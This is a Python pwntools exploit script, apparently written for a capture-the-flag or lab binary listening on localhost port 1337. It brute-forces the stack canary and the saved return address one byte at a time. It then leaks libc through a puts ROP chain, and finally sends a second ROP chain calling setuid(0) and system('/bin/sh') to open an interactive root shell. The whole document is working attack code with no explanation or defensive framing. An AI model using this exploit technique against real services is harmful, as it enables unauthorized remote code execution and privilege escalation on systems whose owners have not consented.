#!/bin/python

from pwn import * 
import time
import sys

BUFFER_LEN  = 0x90-8
MAIN_OFFSET = 0x16c9

context.arch = 'amd64'
context.log_level = 'error'

def brute_force_qword(offset=0, qword=None, middle=b''):
    if qword is None:
        qword = bytearray(8)

    for i in range(8):
        while True:
            proc = remote('localhost', 1337)
            proc.send(b'X' * offset 
                      + middle 
                      + bytes(qword[:i+1]))
            try:
                if proc.recvuntil(b"### Goodbye!", timeout=1) != '':
                    break
            except EOFError as _:
                if qword[i] == 255:
                    print(f"qword[{i}] out of byte range.")
                    qword[i] = 0
                else:
                    qword[i] += 1

    return qword


#server = process(sys.argv[1])
#elf = server.elf
elf  = ELF(sys.argv[1])
libc = elf.libc


canary = brute_force_qword(BUFFER_LEN)
print(f"[$] Canary: {canary.hex()}")

saved_rip = bytearray(8)
saved_rip[0] =   MAIN_OFFSET & 0x00FF
saved_rip[1] = ((MAIN_OFFSET // 16 ** 2) & 0x0F)
saved_rip = brute_force_qword(BUFFER_LEN, saved_rip, bytes(canary) + bytes(8))
print(f"[$] Saved rip: {hex(u64(saved_rip))}")

elf.address = u64(saved_rip) - MAIN_OFFSET
print("[$] elf.addr: " + hex(elf.address))


rop = ROP(elf)
rop.puts(elf.got['puts'])
print(rop.dump())

proc = remote('localhost', 1337)
padding = b'Y' * BUFFER_LEN + canary + b'Z' * 8
proc.send(padding + rop.chain())
proc.recvuntil(b"Leaving!\n")
libc.address = u64(proc.recvline(drop=True).ljust(8, b'\x00')) - libc.symbols['puts']
print("[$] libc address: " + hex(libc.address))


rop = ROP(libc)
rop.setuid(0)
#rop.raw(rop.ret)
rop.system( next(libc.search(b'/bin/sh')) )
print("\n" + rop.dump())
proc = remote('localhost', 1337)
proc.send(padding + rop.chain())

proc.interactive()
